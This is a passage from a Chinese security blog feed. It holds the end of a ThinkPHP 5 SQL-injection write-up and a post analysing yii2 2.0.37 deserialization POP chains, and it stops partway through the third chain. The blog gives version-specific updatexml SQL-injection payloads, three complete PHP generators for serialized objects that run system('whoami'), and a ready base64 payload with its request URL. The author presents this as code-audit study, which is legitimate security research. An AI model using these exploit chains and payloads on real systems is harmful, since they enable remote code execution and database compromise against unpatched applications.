src="https://gitee.com/lcdm123/image/raw/master/image-20211031003033967.png" alt="image-20211031003033967"></p><p>不同版本的 payload 有一定的差别</p><blockquote><p>5.0.0~5.0.21、5.1.3～5.1.10: id)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p><p>5.1.11～5.1.25: id`)%2bupdatexml(1,concat(0x7,user(),0x7e),1) from users%23</p></blockquote><p><strong>漏洞分析</strong></p><p>直接根据 payload 传入的位置分析</p><p>先是对输入的 payload 进行了一些处理，加上了括号和反引号，之后就会进入<code>select()</code> 函数去进行SQL语句的拼接</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010520705.png" alt="image-20211031010520705"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010535400.png" alt="image-20211031010535400"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010558540.png" alt="image-20211031010558540"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031010810261.png" alt="image-20211031010810261"></p><p>最后构造的结果是这个样</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211031012135626.png" alt="image-20211031012135626"></p><p>官方的修复方法就是在<code>parseKey()</code>过滤了一些 字母 点号 星号 以外的字符</p><p>参考文章</p><p><a href="https://mochazz.github.io/2019/04/02/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/">https://mochazz.github.io/2019/04/02/ThinkPHP5%E6%BC%8F%E6%B4%9E%E5%88%86%E6%9E%90%E4%B9%8BSQL%E6%B3%A8%E5%85%A56/</a></p><h2 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h2><p>这个只是参考了别的大师傅的文章复现了一下SQL漏洞，主要是为了提升代码审计的能力也是为了能够了解ThinkPHP框架，并且在审计的过程中发现ThinkPHP的注入漏洞都在 Build 类中的方法。但是对于自己想挖这样的漏洞出来还是很不容易的…………继续学习吧希望有一天能够自己审计出一个0day。经过这几个漏洞的分析，框架的调试能力也熟练了许多。</p><p>参考文章</p><p><a href="https://mochazz.github.io/">https://mochazz.github.io/</a></p><p><a href="https://y4er.com/post/thinkphp5-source-read/">https://y4er.com/post/thinkphp5-source-read/</a></p><p><a href="https://y4er.com/post/thinkphp5-rce/">https://y4er.com/post/thinkphp5-rce/</a></p><p><a href="https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.1.html">https://www.hacking8.com/bug-web/Thinkphp/Thinkphp-5.x-%E5%91%BD%E4%BB%A4%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E/Thinkphp-5.0.1.html</a></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;ThinkPHP-5&quot;&gt;&lt;a href=&quot;#ThinkPHP-5&quot; class=&quot;headerlink&quot; title=&quot;ThinkPHP 5&quot;&gt;&lt;/a&gt;ThinkPHP 5&lt;/h1&gt;&lt;h2 id=&quot;框架学习&quot;&gt;&lt;a href=&quot;#框架学习&quot; class=&quot;head</summary>
      
    
    
    
    <category term="Web" scheme="http://example.com/categories/Web/"/>
    
    
    <category term="代码审计" scheme="http://example.com/tags/%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
    
  </entry>
  
  <entry>
    <title>yii2 反序列化POP链</title>
    <link href="http://example.com/2021/10/28/yii2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE/"/>
    <id>http://example.com/2021/10/28/yii2-%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96POP%E9%93%BE/</id>
    <published>2021-10-28T10:30:23.000Z</published>
    <updated>2021-10-28T10:33:25.555Z</updated>
    
    <content type="html"><![CDATA[<h1 id="yii2-反序列化漏洞"><a href="#yii2-反序列化漏洞" class="headerlink" title="yii2 反序列化漏洞"></a>yii2 反序列化漏洞</h1><h2 id="环境配置"><a href="#环境配置" class="headerlink" title="环境配置"></a>环境配置</h2><p>源码下载：<a href="https://github.com/yiisoft/yii2/releases/tag/2.0.37">https://github.com/yiisoft/yii2/releases/tag/2.0.37</a></p><p>在<code>config/web.php</code>中给<code>cookieValidationKey</code>配置添加一个密钥</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027122133108.png" alt="image-20211027122133108"></p><p>写入一个反序列化入口</p><p><code>controllers/SerializeController.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">app</span>\<span class="hljs-title">controllers</span>;<br><br><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">SerializeController</span> <span class="hljs-keyword">extends</span> \<span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">Controller</span></span>&#123;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">actionSerialize</span>(<span class="hljs-params">$data</span>)</span>&#123;<br>        <span class="hljs-keyword">return</span> unserialize(base64_decode($data));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><p>启动框架 <code>php yii serve</code> 默认端口为 8080 可以通过 <code>--port=port</code> 更换端口</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027123716179.png" alt="image-20211027123716179"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027123846587.png" alt="image-20211027123846587"></p><p>使用手册帮助我们快速理解框架：<a href="https://www.kancloud.cn/manual/yii2-guide/69671">https://www.kancloud.cn/manual/yii2-guide/69671</a></p><p>路由访问方式</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027131522065.png" alt="image-20211027131522065"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027131613252.png" alt="image-20211027131613252"></p><h2 id="反序列化漏洞"><a href="#反序列化漏洞" class="headerlink" title="反序列化漏洞"></a>反序列化漏洞</h2><h3 id="POP-1"><a href="#POP-1" class="headerlink" title="POP 1"></a>POP 1</h3><blockquote><p>跟着大师傅分析一下</p></blockquote><p>入口点 <code>vendor/yiisoft/yii2/db/BatchQueryResult.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-comment">// make sure cursor is closed</span><br>        <span class="hljs-keyword">$this</span>-&gt;reset();<br>    &#125;<br><br><br><span class="hljs-comment">// 这里的 _dataReader 参数可控，所以可以利用这个参数去执行其他类的 close() 函数</span><br><span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">reset</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;_dataReader !== <span class="hljs-literal">null</span>) &#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader-&gt;close();<br>        &#125;<br>        <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_batch = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_value = <span class="hljs-literal">null</span>;<br>        <span class="hljs-keyword">$this</span>-&gt;_key = <span class="hljs-literal">null</span>;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/web/DbSession.php 中的 close() 函数</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">close</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;getIsActive()) &#123;<br>            <span class="hljs-comment">// prepare writeCallback fields before session closes</span><br>            <span class="hljs-keyword">$this</span>-&gt;fields = <span class="hljs-keyword">$this</span>-&gt;composeFields();<br>            YII_DEBUG ? session_write_close() : @session_write_close();<br>        &#125;<br>    &#125;<br><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getIsActive</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> session_status() === PHP_SESSION_ACTIVE;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/web/MultiFieldSession.php</span><br>    <span class="hljs-keyword">protected</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">composeFields</span>(<span class="hljs-params">$id = <span class="hljs-literal">null</span>, $data = <span class="hljs-literal">null</span></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        $fields = <span class="hljs-keyword">$this</span>-&gt;writeCallback ? call_user_func(<span class="hljs-keyword">$this</span>-&gt;writeCallback, <span class="hljs-keyword">$this</span>) : [];<br>        <span class="hljs-keyword">if</span> ($id !== <span class="hljs-literal">null</span>) &#123;<br>            $fields[<span class="hljs-string">&#x27;id&#x27;</span>] = $id;<br>        &#125;<br>        <span class="hljs-keyword">if</span> ($data !== <span class="hljs-literal">null</span>) &#123;<br>            $fields[<span class="hljs-string">&#x27;data&#x27;</span>] = $data;<br>        &#125;<br>        <span class="hljs-keyword">return</span> $fields;<br>    &#125;<br><br><span class="hljs-comment">// vendor/yiisoft/yii2/rest/IndexAction.php</span><br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">run</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">$this</span>-&gt;checkAccess) &#123;<br>            call_user_func(<span class="hljs-keyword">$this</span>-&gt;checkAccess, <span class="hljs-keyword">$this</span>-&gt;id);<br>        &#125;<br><br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;prepareDataProvider();<br>    &#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027211239754.png" alt="image-20211027211239754"></p><p><code>call_user_func</code> 的一个不常见特性：<a href="https://www.php.net/manual/zh/language.types.callable.php">https://www.php.net/manual/zh/language.types.callable.php</a></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027225853020.png" alt="image-20211027225853020"></p><p>主要的链就是</p><p>利用 <code>BatchQueryResult.php</code> 中的 <code>BatchQueryResult</code> 的析构函数为入口，在执行<code>reset()</code> 函数中的 <code>close()</code> 函数时因为这里的<code>_dataReader</code>参数可控所以有两种选择，第一时找其他类的 <code>close()</code>函数来执行第二个是寻找<code>__call</code> 魔术方法，这里先选择了第一种，找到了<code>DbSession.php</code> 中<code>DbSession</code>类的<code>close()</code>方法然后执行到<code>MultiFieldSession</code>的<code>composeFields()</code>方法，调用里面的<code>call_user_func()</code>函数去执行某个类中的方法，这里就寻找到了两个可以被调用的<code>run()</code>方法<code>IndexAction.php</code> 和 <code>CreateAction.php</code>，大佬都是使用 <code>IndexAction.php</code> 来构造的POC</p><p>利用<code>IndexAction</code> 构造POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> DbSession();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> IndexAction();<br>            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [$a, <span class="hljs-string">&#x27;run&#x27;</span>];;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs awk"><span class="hljs-regexp">/index.php?r=serialize/</span>serialize&amp;data=TzoyMzoieWlpXGRiXEJhdGNoUXVlcnlSZXN1bHQiOjE6e3M6MzY6IgB5aWlcZGJcQmF0Y2hRdWVyeVJlc3VsdABfZGF0YVJlYWRlciI7TzoxNzoieWlpXHdlYlxEYlNlc3Npb24iOjE6e3M6MTM6IndyaXRlQ2FsbGJhY2siO2E6Mjp7aTowO086MjA6InlpaVxyZXN0XEluZGV4QWN0aW9uIjoyOntzOjExOiJjaGVja0FjY2VzcyI7czo2OiJzeXN0ZW0iO3M6MjoiaWQiO3M6Njoid2hvYW1pIjt9aToxO3M6MzoicnVuIjt9fX0<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027124445391.png" alt="image-20211027124445391"></p><p>尝试利用 <code>CreateAction.php</code> 构造 POC</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br><br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> DbSession();<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span> &#123;<br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">CreateAction</span>;<br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">DbSession</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            $a = <span class="hljs-keyword">new</span> CreateAction();<br>            <span class="hljs-comment">// 这里 DbSession 继承了 MultiFieldSession 所以直接声明变量</span><br>            <span class="hljs-keyword">$this</span>-&gt;writeCallback = [$a, <span class="hljs-string">&#x27;run&#x27;</span>];;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">CreateAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-keyword">namespace</span> &#123;<br><br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br><br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><p>这样也是可以的</p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211027234634925.png" alt="image-20211027234634925"></p><blockquote><p>POC 的编写可以有根据程序的格式来写，和一般的不一样，看别人分析起来很顺利，看看自己就是憨批</p></blockquote><h3 id="POP-2"><a href="#POP-2" class="headerlink" title="POP 2"></a>POP 2</h3><p>这里主要选择上面的另一条路寻找 <code>__call()</code> ，感觉这个可行，然后分析参数是否可控</p><p>最后看见大师父们找的<code>vendor/fzaninotto/faker/src/Faker/Generator.php</code></p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class"></span>&#123;<br>    <span class="hljs-keyword">protected</span> $providers = <span class="hljs-keyword">array</span>();<br>    <span class="hljs-keyword">protected</span> $formatters = <span class="hljs-keyword">array</span>();<br>    ………………<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__call</span>(<span class="hljs-params">$method, $attributes</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;format($method, $attributes);<br>    &#125;<br>    <br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">format</span>(<span class="hljs-params">$formatter, $arguments = <span class="hljs-keyword">array</span>(<span class="hljs-params"></span>)</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">return</span> call_user_func_array(<span class="hljs-keyword">$this</span>-&gt;getFormatter($formatter), $arguments);<br>    &#125;<br>    <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">getFormatter</span>(<span class="hljs-params">$formatter</span>)</span><br><span class="hljs-function">    </span>&#123;<br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-keyword">$this</span>-&gt;formatters[$formatter])) &#123;<br>            <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter];<br>        &#125;<br>        <span class="hljs-keyword">foreach</span> (<span class="hljs-keyword">$this</span>-&gt;providers <span class="hljs-keyword">as</span> $provider) &#123;<br>            <span class="hljs-keyword">if</span> (method_exists($provider, $formatter)) &#123;<br>                <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter] = <span class="hljs-keyword">array</span>($provider, $formatter);<br><br>                <span class="hljs-keyword">return</span> <span class="hljs-keyword">$this</span>-&gt;formatters[$formatter];<br>            &#125;<br>        &#125;<br>        <span class="hljs-keyword">throw</span> <span class="hljs-keyword">new</span> \<span class="hljs-built_in">InvalidArgumentException</span>(sprintf(<span class="hljs-string">&#x27;Unknown formatter &quot;%s&quot;&#x27;</span>, $formatter));<br>    &#125;<br>&#125;<br></code></pre></td></tr></table></figure><blockquote><p>还是可以利用 <code>call_user_func_array()</code></p></blockquote><p>这里的可控参数有<code>$formatters</code> 和 <code>$providers</code> 在<code>__call()</code> 函数中<code>$method</code> 就是 <code>close</code> <code>$attributes</code> 为空，在执行<code>format</code> 函数时传入的值就是 <code>close</code> 和 空，所以在执行 <code>getFormatter()</code> 函数时，就会选取 <code>$formatters</code> 数组中的一个以 <code>$formatter</code> 也就是 <code>close</code> 为键的值这一点我们是可以控制的，并且我们在后面执行<code>call_user_func_array()</code>时也需要选取一个无参函数。</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">Faker</span>\<span class="hljs-title">Generator</span>;<br>    <span class="hljs-keyword">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">web</span>\<span class="hljs-title">DbSession</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">BatchQueryResult</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">private</span> $_dataReader;<br> <br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;_dataReader = <span class="hljs-keyword">new</span> <span class="hljs-built_in">Generator</span>();<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">Faker</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span>\<span class="hljs-title">IndexAction</span>;<br> <br>    <span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">Generator</span></span><br><span class="hljs-class">    </span>&#123;<br>        <span class="hljs-keyword">protected</span> $formatters;<br>        <span class="hljs-keyword">public</span> <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__construct</span>(<span class="hljs-params"></span>)</span><br><span class="hljs-function">        </span>&#123;<br>            <span class="hljs-keyword">$this</span>-&gt;formatters[<span class="hljs-string">&#x27;close&#x27;</span>] = [<span class="hljs-keyword">new</span> IndexAction(), <span class="hljs-string">&#x27;run&#x27;</span>];<br>        &#125;<br>    &#125;<br> <br>&#125;<br> <br><span class="hljs-keyword">namespace</span> <span class="hljs-title">yii</span>\<span class="hljs-title">rest</span> &#123;<br>    <span class="hljs-title">class</span> <span class="hljs-title">IndexAction</span><br>    &#123;<br>        <span class="hljs-title">public</span> <span class="hljs-title">function</span> <span class="hljs-title">__construct</span>()<br>        &#123;<br>            $this-&gt;checkAccess = &#x27;system&#x27;;<br>            <span class="hljs-keyword">$this</span>-&gt;id = <span class="hljs-string">&#x27;whoami&#x27;</span>;<br>        &#125;<br>    &#125;<br>&#125;<br> <br><span class="hljs-keyword">namespace</span> &#123;<br> <br>    <span class="hljs-title">use</span> <span class="hljs-title">yii</span>\<span class="hljs-title">db</span>\<span class="hljs-title">BatchQueryResult</span>;<br> <br>    <span class="hljs-keyword">echo</span> base64_encode(serialize(<span class="hljs-keyword">new</span> BatchQueryResult()));<br>&#125;<br></code></pre></td></tr></table></figure><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028173015512.png" alt="image-20211028173015512"></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028005049779.png" alt="image-20211028005049779"></p><h3 id="POP-3"><a href="#POP-3" class="headerlink" title="POP 3"></a>POP 3</h3><p>这里选择的思路就是选择其他的<code>__deestruct()</code>析构函数来调用<code>__call()</code>，这里的<code>__call()</code> 可以使用 POP2 的 <code>__call()</code></p><p><img src="https://gitee.com/lcdm123/image/raw/master/image-20211028105033811.png" alt="image-20211028105033811"></p><p>这里的<code>$this-&gt;processes</code>参数可控，然后控制这个参数去调用<code>Generator</code>类中的<code>__call()</code>去执行代码</p><figure class="highlight php"><table><tr><td 